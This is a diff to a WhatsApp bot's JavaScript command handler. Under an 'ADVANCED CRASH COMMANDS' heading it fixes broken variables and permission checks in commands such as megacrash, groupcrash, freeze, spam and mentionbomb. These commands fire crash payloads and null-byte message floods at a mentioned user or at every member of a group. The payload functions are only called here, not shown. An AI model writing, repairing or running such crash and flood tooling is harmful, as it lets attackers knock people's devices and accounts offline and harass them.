@@ -3077,9 +3077,13 @@ ${adminList}`,
             reply(`✅ *Goodbye message set!*\n\n${text}`);
             break;
         }
-        case 'blankgc': {
+        // ============================================================
+// ADVANCED CRASH COMMANDS - CORRECTED
+// ============================================================
+
+case 'blankgc': {
     if (!isCreator) return reply('❌ Only the bot creator can use this.');
-    if (!isAdmin) return reply('❌ You need to be a group admin.');
+    if (!isAdmins) return reply('❌ You need to be a group admin.');
     if (!m.isGroup) return reply('❌ Only in groups.');
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`📰 Blank GC on ${target}...`);
@@ -3089,7 +3093,9 @@ ${adminList}`,
 }
 
 case 'galaxy': {
-    if (!isCreator || !isAdmin || !m.isGroup) return;
+    if (!isCreator) return reply('❌ Only the bot creator can use this.');
+    if (!isAdmins) return reply('❌ You need to be a group admin.');
+    if (!m.isGroup) return reply('❌ Only in groups.');
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`🌌 Galaxy on ${target}...`);
     await galaxy(target);
@@ -3098,7 +3104,9 @@ case 'galaxy': {
 }
 
 case 'paynull': {
-    if (!isCreator || !isAdmin || !m.isGroup) return;
+    if (!isCreator) return reply('❌ Only the bot creator can use this.');
+    if (!isAdmins) return reply('❌ You need to be a group admin.');
+    if (!m.isGroup) return reply('❌ Only in groups.');
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`💰 PayNull on ${target}...`);
     await payNulL(target);
@@ -3107,7 +3115,9 @@ case 'paynull': {
 }
 
 case 'ioslx': {
-    if (!isCreator || !isAdmin || !m.isGroup) return;
+    if (!isCreator) return reply('❌ Only the bot creator can use this.');
+    if (!isAdmins) return reply('❌ You need to be a group admin.');
+    if (!m.isGroup) return reply('❌ Only in groups.');
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`📱 iOS LX on ${target}...`);
     await iosLx(target);
@@ -3116,7 +3126,9 @@ case 'ioslx': {
 }
 
 case 'rpnm': {
-    if (!isCreator || !isAdmin || !m.isGroup) return;
+    if (!isCreator) return reply('❌ Only the bot creator can use this.');
+    if (!isAdmins) return reply('❌ You need to be a group admin.');
+    if (!m.isGroup) return reply('❌ Only in groups.');
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`📞 RPNM on ${target}...`);
     await rpnm(target);
@@ -3125,7 +3137,9 @@ case 'rpnm': {
 }
 
 case 'trashloc': {
-    if (!isCreator || !isAdmin || !m.isGroup) return;
+    if (!isCreator) return reply('❌ Only the bot creator can use this.');
+    if (!isAdmins) return reply('❌ You need to be a group admin.');
+    if (!m.isGroup) return reply('❌ Only in groups.');
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`🗑️ TrashLoc on ${target}...`);
     await TrashLocIOS(target);
@@ -3134,7 +3148,9 @@ case 'trashloc': {
 }
 
 case 'invitea': {
-    if (!isCreator || !isAdmin || !m.isGroup) return;
+    if (!isCreator) return reply('❌ Only the bot creator can use this.');
+    if (!isAdmins) return reply('❌ You need to be a group admin.');
+    if (!m.isGroup) return reply('❌ Only in groups.');
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`📨 Invite A on ${target}...`);
     await InViteAdminA(target);
@@ -3143,7 +3159,9 @@ case 'invitea': {
 }
 
 case 'invitei': {
-    if (!isCreator || !isAdmin || !m.isGroup) return;
+    if (!isCreator) return reply('❌ Only the bot creator can use this.');
+    if (!isAdmins) return reply('❌ You need to be a group admin.');
+    if (!m.isGroup) return reply('❌ Only in groups.');
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`📨 Invite I on ${target}...`);
     await InViteAdminI(target);
@@ -3152,7 +3170,9 @@ case 'invitei': {
 }
 
 case 'pollbomb': {
-    if (!isCreator || !isAdmin || !m.isGroup) return;
+    if (!isCreator) return reply('❌ Only the bot creator can use this.');
+    if (!isAdmins) return reply('❌ You need to be a group admin.');
+    if (!m.isGroup) return reply('❌ Only in groups.');
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`📊 Poll bomb on ${target}...`);
     await EmpireFcPoll(target);
@@ -3161,23 +3181,25 @@ case 'pollbomb': {
 }
 
 case 'betadelay': {
-    if (!isCreator || !isAdmin || !m.isGroup) return;
+    if (!isCreator) return reply('❌ Only the bot creator can use this.');
+    if (!isAdmins) return reply('❌ You need to be a group admin.');
+    if (!m.isGroup) return reply('❌ Only in groups.');
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`❄️ BetaDelay on ${target}...`);
     await betaDelay(empire, target);
     await reply(`✅ BetaDelay complete.`);
     break;
 }
-        
-        case 'nah':
+
+case 'nah':
 case 'buttonbomb': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`💣 Button bombing ${target}...`);
-    await nah(violet, target);
+    await nah(empire, target);
     await reply(`✅ Button bomb sent.`);
     break;
 }
@@ -3185,7 +3207,7 @@ case 'buttonbomb': {
 case 'invisible':
 case 'delayinv': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
@@ -3197,19 +3219,19 @@ case 'delayinv': {
 
 case 'bulldog': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`🐕 Bulldog attacking ${target}...`);
-    await BulldogDog(violet, target);
+    await BulldogDog(empire, target);
     await reply(`✅ Bulldog complete.`);
     break;
 }
 
 case 'jarr': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
@@ -3221,30 +3243,30 @@ case 'jarr': {
 
 case 'hardbulldo': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`🔥 Hard Bulldo on ${target}...`);
-    await DelayHardBulldo(violet, target);
+    await DelayHardBulldo(empire, target);
     await reply(`✅ Hard Bulldo complete.`);
     break;
 }
 
 case 'megacrash': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`💀💀💀 MEGA CRASH on ${target} 💀💀💀`);
     
     await Promise.all([
-        nah(violet, target),
+        nah(empire, target),
         DelayInvisible(target),
-        BulldogDog(violet, target),
+        BulldogDog(empire, target),
         DelayJarr(target),
-        DelayHardBulldo(violet, target)
+        DelayHardBulldo(empire, target)
     ]);
     
     await reply(`💀 ${target} has been mega-crashed.`);
@@ -3255,7 +3277,7 @@ case 'crash':
 case 'kill':
 case 'destroy': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
@@ -3264,7 +3286,7 @@ case 'destroy': {
         gsInt(target, true),
         delay1(target),
         zXfreeze(target),
-        InvSCrt(violet, target)
+        InvSCrt(empire, target)
     ]);
     await reply(`✅ Destruction complete on ${target}`);
     break;
@@ -3272,7 +3294,7 @@ case 'destroy': {
 
 case 'supercrash': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
@@ -3284,7 +3306,7 @@ case 'supercrash': {
 
 case 'finalkill': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
@@ -3296,7 +3318,7 @@ case 'finalkill': {
 
 case 'freeze': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
@@ -3308,17 +3330,17 @@ case 'freeze': {
 
 case 'spam': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
-    const count = parseInt(m.args[0]) || 50;
+    const count = parseInt(args[0]) || 50;
     await reply(`📨 Spamming ${target} with ${count} messages...`);
     for (let i = 0; i < count; i++) {
-        await violet.sendMessage(target, {
+        await empire.sendMessage(target, {
             text: `💀 SPAM ${i+1}/${count} ` + "\u0000".repeat(1000)
         }).catch(() => {});
-        await sleep(50);
+        await delay(50);
     }
     await reply(`✅ Spam complete.`);
     break;
@@ -3326,17 +3348,17 @@ case 'spam': {
 
 case 'mentionbomb': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
     await reply(`🔔 Mention bombing ${target}...`);
     for (let i = 0; i < 100; i++) {
-        await violet.sendMessage(m.chat, {
+        await empire.sendMessage(m.chat, {
             text: `@${target.split('@')[0]}`,
             mentions: [target]
         }).catch(() => {});
-        await sleep(30);
+        await delay(30);
     }
     await reply(`✅ Mention bomb complete.`);
     break;
@@ -3344,11 +3366,11 @@ case 'mentionbomb': {
 
 case 'groupcrash': {
     if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
     if (!m.isGroup) return reply('❌ This command only works in groups.');
     
     await reply(`💀 Crashing entire group...`);
-    const participants = m.groupMetadata?.participants || [];
+    const participants = groupMetadata?.participants || [];
     for (const p of participants) {
         const target = p.id;
         await Promise.all([
@@ -3356,12 +3378,11 @@ case 'groupcrash': {
             delay1(target),
             zXfreeze(target)
         ]);
-        await sleep(100);
+        await delay(100);
     }
     await reply(`✅ Group crash complete.`);
     break;
 }
-
         // ═══════════════════════════════════════════════════
         // Add new commands below this line, e.g.:
         //
